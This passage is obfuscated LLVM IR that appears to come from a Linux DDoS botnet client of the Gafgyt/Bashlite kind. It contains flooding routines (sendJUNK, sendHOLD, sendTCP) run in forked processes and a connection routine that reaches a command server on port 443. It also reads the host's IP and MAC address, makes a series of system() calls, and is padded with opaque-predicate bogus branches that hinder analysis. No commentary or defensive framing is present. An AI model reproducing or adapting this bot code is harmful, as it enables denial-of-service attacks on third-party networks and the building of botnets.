  %1971 = call i32 @strcmp(i8* %1970, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i32 0, i32 0)) #10
  %1972 = icmp ne i32 %1971, 0
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %929
  %1973 = load i32, i32* %3, align 4
  %1974 = icmp slt i32 %1973, 3
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %954
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %982
  %1975 = load i8*, i8** %26, align 8
  %1976 = call i8* @strtok(i8* %1975, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1976, i8** %28, align 8
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1004
  %1977 = call i32 @listFork()
  %1978 = icmp ne i32 %1977, 0
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1035
  %1979 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1979, i8** %28, align 8
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1053
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1074
  store i32 0, i32* %30, align 4
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1099
  %1980 = load i32, i32* @mainCommSock, align 4
  %1981 = call i32 @close(i32 %1980)
  call void @_exit(i32 0) #12
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1128
  %1982 = load i8**, i8*** %4, align 8
  %1983 = getelementptr inbounds i8*, i8** %1982, i64 2
  %1984 = load i8*, i8** %1983, align 8
  %1985 = call i32 @atoi(i8* %1984) #10
  %1986 = icmp slt i32 %1985, 1
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1156
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1188
  %1987 = load i8*, i8** %31, align 8
  %1988 = call i8* @strtok(i8* %1987, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1988, i8** %34, align 8
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1219
  %1989 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1989, i8** %34, align 8
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1237
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1262
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1279
  %1990 = load i8**, i8*** %4, align 8
  %1991 = getelementptr inbounds i8*, i8** %1990, i64 0
  %1992 = load i8*, i8** %1991, align 8
  %1993 = call i32 @strcmp(i8* %1992, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0)) #10
  %1994 = icmp ne i32 %1993, 0
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1310
  %1995 = load i8**, i8*** %4, align 8
  %1996 = getelementptr inbounds i8*, i8** %1995, i64 3
  %1997 = load i8*, i8** %1996, align 8
  %1998 = call i32 @atoi(i8* %1997) #10
  %1999 = icmp slt i32 %1998, 1
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1332
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1364
  %2000 = load i8*, i8** %35, align 8
  %2001 = call i8* @strtok(i8* %2000, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %2001, i8** %38, align 8
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1383
  %2002 = load i8*, i8** %38, align 8
  %2003 = icmp ne i8* %2002, null
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1417
  %2004 = call i32 @listFork()
  %2005 = icmp ne i32 %2004, 0
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1437
  %2006 = load i8*, i8** %35, align 8
  %2007 = load i32, i32* %36, align 4
  %2008 = load i32, i32* %37, align 4
  call void @sendJUNK(i8* %2006, i32 %2007, i32 %2008)
  %2009 = load i8*, i8** %35, align 8
  %2010 = load i32, i32* %36, align 4
  %2011 = load i32, i32* %37, align 4
  call void @sendHOLD(i8* %2009, i32 %2010, i32 %2011)
  call void @_exit(i32 0) #12
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1467
  %2012 = load i32, i32* %3, align 4
  %2013 = icmp slt i32 %2012, 6
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1486
  %2014 = load i8**, i8*** %4, align 8
  %2015 = getelementptr inbounds i8*, i8** %2014, i64 3
  %2016 = load i8*, i8** %2015, align 8
  %2017 = call i32 @atoi(i8* %2016) #10
  %2018 = icmp eq i32 %2017, -1
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1529
  %2019 = load i8**, i8*** %4, align 8
  %2020 = getelementptr inbounds i8*, i8** %2019, i64 6
  %2021 = load i8*, i8** %2020, align 8
  %2022 = call i32 @atoi(i8* %2021) #10
  %2023 = icmp slt i32 %2022, 0
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1554
  %2024 = load i8**, i8*** %4, align 8
  %2025 = getelementptr inbounds i8*, i8** %2024, i64 7
  %2026 = load i8*, i8** %2025, align 8
  %2027 = call i32 @atoi(i8* %2026) #10
  %2028 = icmp slt i32 %2027, 1
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1613
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1644
  %2029 = load i8*, i8** %46, align 8
  %2030 = load i32, i32* %40, align 4
  %2031 = load i32, i32* %41, align 4
  %2032 = load i32, i32* %42, align 4
  %2033 = load i8*, i8** %43, align 8
  %2034 = load i32, i32* %45, align 4
  %2035 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %2029, i32 %2030, i32 %2031, i32 %2032, i8* %2033, i32 %2034, i32 %2035)
  call void @_exit(i32 0) #12
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1670
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1691
  %2036 = load i8*, i8** %39, align 8
  %2037 = load i32, i32* %40, align 4
  %2038 = load i32, i32* %41, align 4
  %2039 = load i32, i32* %42, align 4
  %2040 = load i8*, i8** %43, align 8
  %2041 = load i32, i32* %45, align 4
  %2042 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %2036, i32 %2037, i32 %2038, i32 %2039, i8* %2040, i32 %2041, i32 %2042)
  call void @_exit(i32 0) #12
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1715
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1739
  %2043 = load i64, i64* %48, align 8
  %2044 = load i64, i64* @numpids, align 8
  %2045 = icmp ult i64 %2043, %2044
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1780
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1807
  call void @exit(i32 0) #14
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1830
  %2046 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.87, i32 0, i32 0))
  %2047 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.88, i32 0, i32 0))
  %2048 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  %2049 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.90, i32 0, i32 0))
  %2050 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.91, i32 0, i32 0))
  %2051 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0))
  %2052 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.93, i32 0, i32 0))
  %2053 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.94, i32 0, i32 0))
  br label %originalBB254
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @x.81
  %18 = load i32, i32* @y.82
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @currentServer, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* @currentServer, align 4
  %27 = load i32, i32* @x.81
  %28 = load i32, i32* @y.82
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2, %15
  %36 = load i32, i32* @x.81
  %37 = load i32, i32* @y.82
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %35
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %45 = load i32, i32* @currentServer, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %46
  %48 = load i8*, i8** %47, align 8
  %49 = call i8* @strcpy(i8* %44, i8* %48) #2
  store i32 443, i32* %3, align 4
  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #10
  %52 = icmp ne i8* %51, null
  %53 = load i32, i32* @x.81
  %54 = load i32, i32* @y.82
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br i1 %52, label %61, label %68

; <label>:61:                                     ; preds = %originalBBpart25
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %63 = call i8* @strchr(i8* %62, i32 58) #10
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = call i32 @atoi(i8* %64) #10
  store i32 %65, i32* %3, align 4
  %66 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %67 = call i8* @strchr(i8* %66, i32 58) #10
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %61, %originalBBpart25
  %69 = load i32, i32* @x.81
  %70 = load i32, i32* @y.82
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %68
  %77 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %77, i32* @mainCommSock, align 4
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %80 = load i32, i32* %3, align 4
  %81 = call i32 @connectTimeout(i32 %78, i8* %79, i32 %80, i32 30)
  %82 = icmp ne i32 %81, 0
  %83 = load i32, i32* @x.81
  %84 = load i32, i32* @y.82
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br i1 %82, label %108, label %91

; <label>:91:                                     ; preds = %originalBBpart29
  %92 = load i32, i32* @x.81
  %93 = load i32, i32* @y.82
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %91
  store i32 1, i32* %1, align 4
  %100 = load i32, i32* @x.81
  %101 = load i32, i32* @y.82
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %109

; <label>:108:                                    ; preds = %originalBBpart29
  store i32 0, i32* %1, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %originalBBpart213
  %110 = load i32, i32* @x.81
  %111 = load i32, i32* @y.82
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %109
  %118 = load i32, i32* %1, align 4
  %119 = load i32, i32* @x.81
  %120 = load i32, i32* @y.82
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  ret i32 %118

originalBBalteredBB:                              ; preds = %originalBB, %16
  %127 = load i32, i32* @currentServer, align 4
  %_ = sub i32 0, %127
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %127
  %gen2 = add i32 %_1, 1
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* @currentServer, align 4
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %35
  %129 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %130 = load i32, i32* @currentServer, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = call i8* @strcpy(i8* %129, i8* %133) #2
  store i32 443, i32* %3, align 4
  %135 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %136 = call i8* @strchr(i8* %135, i32 58) #10
  %137 = icmp ne i8* %136, null
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %68
  %138 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %138, i32* @mainCommSock, align 4
  %139 = load i32, i32* @mainCommSock, align 4
  %140 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %141 = load i32, i32* %3, align 4
  %142 = call i32 @connectTimeout(i32 %139, i8* %140, i32 %141, i32 30)
  %143 = icmp ne i32 %142, 0
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %91
  store i32 1, i32* %1, align 4
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %109
  %144 = load i32, i32* %1, align 4
  br label %originalBB15
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.83
  %17 = load i32, i32* @y.84
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.83
  %25 = load i32, i32* @y.84
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %181

; <label>:32:                                     ; preds = %0
  %33 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 16, i32 4, i1 false)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0)) #2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %37 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %36, i32 0, i32 0
  store i32 %35, i32* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 53) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i32, i32* %2, align 4
  %41 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %4, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %32
  store i32 0, i32* %1, align 4
  br label %181

; <label>:46:                                     ; preds = %32
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @x.83
  %54 = load i32, i32* @y.84
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 0, i32* %1, align 4
  %61 = load i32, i32* @x.83
  %62 = load i32, i32* @y.84
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %181

; <label>:69:                                     ; preds = %46
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %71 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %70, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  store i32 %72, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %73 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.96, i32 0, i32 0), i32 0)
  store i32 %73, i32* %7, align 4
  br label %74

; <label>:74:                                     ; preds = %111, %69
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = load i32, i32* %7, align 4
  %77 = call i8* @fdgets(i8* %75, i32 4096, i32 %76)
  %78 = icmp ne i8* %77, null
  br i1 %78, label %79, label %113

; <label>:79:                                     ; preds = %74
  %80 = load i32, i32* @x.83
  %81 = load i32, i32* @y.84
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %79
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %89 = call i8* @strstr(i8* %88, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0)) #10
  %90 = icmp ne i8* %89, null
  %91 = load i32, i32* @x.83
  %92 = load i32, i32* @y.84
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %90, label %99, label %111

; <label>:99:                                     ; preds = %originalBBpart28
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %100, i8** %9, align 8
  br label %101

; <label>:101:                                    ; preds = %106, %99
  %102 = load i8*, i8** %9, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp ne i32 %104, 9
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %101
  %107 = load i8*, i8** %9, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %9, align 8
  br label %101

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %9, align 8
  store i8 0, i8* %110, align 1
  br label %113

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %112, i8 0, i64 4096, i32 16, i1 false)
  br label %74

; <label>:113:                                    ; preds = %109, %74
  %114 = load i32, i32* %7, align 4
  %115 = call i32 @close(i32 %114)
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %117 = load i8, i8* %116, align 16
  %118 = icmp ne i8 %117, 0
  br i1 %118, label %119, label %178

; <label>:119:                                    ; preds = %113
  %120 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %121 = bitcast %union.anon.6* %120 to [16 x i8]*
  %122 = getelementptr inbounds [16 x i8], [16 x i8]* %121, i32 0, i32 0
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %124 = call i8* @strcpy(i8* %122, i8* %123) #2
  %125 = load i32, i32* %2, align 4
  %126 = call i32 (i32, i64, ...) @ioctl(i32 %125, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %127

; <label>:127:                                    ; preds = %originalBBpart220, %119
  %128 = load i32, i32* %10, align 4
  %129 = icmp slt i32 %128, 6
  br i1 %129, label %130, label %177

; <label>:130:                                    ; preds = %127
  %131 = load i32, i32* @x.83
  %132 = load i32, i32* @y.84
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %130
  %139 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %140 = bitcast %union.anon.7* %139 to %struct.sockaddr*
  %141 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %140, i32 0, i32 1
  %142 = getelementptr inbounds [14 x i8], [14 x i8]* %141, i32 0, i32 0
  %143 = load i32, i32* %10, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  %146 = load i8, i8* %145, align 1
  %147 = load i32, i32* %10, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %148
  store i8 %146, i8* %149, align 1
  %150 = load i32, i32* @x.83
  %151 = load i32, i32* @y.84
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %158

; <label>:158:                                    ; preds = %originalBBpart212
  %159 = load i32, i32* @x.83
  %160 = load i32, i32* @y.84
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %158
  %167 = load i32, i32* %10, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %10, align 4
  %169 = load i32, i32* @x.83
  %170 = load i32, i32* @y.84
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart220, label %originalBB14alteredBB

originalBBpart220:                                ; preds = %originalBB14
  br label %127

; <label>:177:                                    ; preds = %127
  br label %178

; <label>:178:                                    ; preds = %177, %113
  %179 = load i32, i32* %2, align 4
  %180 = call i32 @close(i32 %179)
  br label %181

; <label>:181:                                    ; preds = %178, %originalBBpart24, %45, %originalBBpart2
  %182 = load i32, i32* %1, align 4
  ret i32 %182

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 0, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %79
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %184 = call i8* @strstr(i8* %183, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0)) #10
  %185 = icmp ne i8* %184, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %130
  %186 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %187 = bitcast %union.anon.7* %186 to %struct.sockaddr*
  %188 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %187, i32 0, i32 1
  %189 = getelementptr inbounds [14 x i8], [14 x i8]* %188, i32 0, i32 0
  %190 = load i32, i32* %10, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8, i8* %189, i64 %191
  %193 = load i8, i8* %192, align 1
  %194 = load i32, i32* %10, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %195
  store i8 %193, i8* %196, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %158
  %197 = load i32, i32* %10, align 4
  %_ = sub i32 %197, 1
  %gen = mul i32 %_, 1
  %_15 = sub i32 0, %197
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 0, %197
  %gen18 = add i32 %_17, 1
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %10, align 4
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
